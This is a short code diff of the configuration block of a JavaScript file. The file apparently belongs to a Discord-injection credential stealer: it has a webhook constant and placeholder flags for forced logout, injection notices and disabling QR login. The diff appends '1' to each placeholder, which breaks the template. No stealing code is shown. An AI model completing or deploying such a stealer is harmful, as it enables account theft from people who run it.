@@ -10,12 +10,12 @@ const buf_replace = require('buffer-replace');
 const webhook = "da_webhook"
 
 const config = {
-    "logout": "%LOGOUT%",
-    "inject-notify": "%INJECTNOTI%",
-    "logout-notify": "%LOGOUTNOTI%",
-    "init-notify":"%INITNOTI%",
-    "embed-color": %MBEDCOLOR%,
-    "disable-qr-code": "%DISABLEQRCODE%"
+    "logout": "%LOGOUT%1",
+    "inject-notify": "%INJECTNOTI%1",
+    "logout-notify": "%LOGOUTNOTI%1",
+    "init-notify":"%INITNOTI%1",
+    "embed-color": %MBEDCOLOR%1,
+    "disable-qr-code": "%DISABLEQRCODE%1"
 }
 
 
